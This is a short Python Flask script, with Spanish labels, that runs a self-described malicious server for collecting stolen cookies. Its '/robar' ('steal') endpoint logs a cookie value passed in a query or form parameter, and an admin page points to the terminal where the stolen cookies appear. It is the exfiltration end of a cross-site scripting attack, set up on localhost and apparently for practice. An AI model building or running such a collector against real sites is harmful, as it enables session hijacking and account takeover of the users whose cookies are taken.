#!/usr/bin/env python3
from flask import Flask, request
app = Flask(__name__)

@app.route('/robar', methods=['GET', 'POST'])
def robar():
    cookies = request.args.get('c') or request.form.get('c')
    print(f"🚨 PETICIÓN RECIBIDA!")
    print(f"   Cookies: '{cookies}'")
    print(f"   URL completa: {request.url}")
    print("-" * 30)
    return "OK"

@app.route('/admin')
def admin():
    return "<h1>Servidor funcionando</h1><p>Revisa la terminal para ver cookies robadas</p>"

if __name__ == '__main__':
    print("🚨 Servidor malicioso en http://localhost:9999")
    print("📊 Admin: http://localhost:9999/admin")
    app.run(port=9999, debug=False) 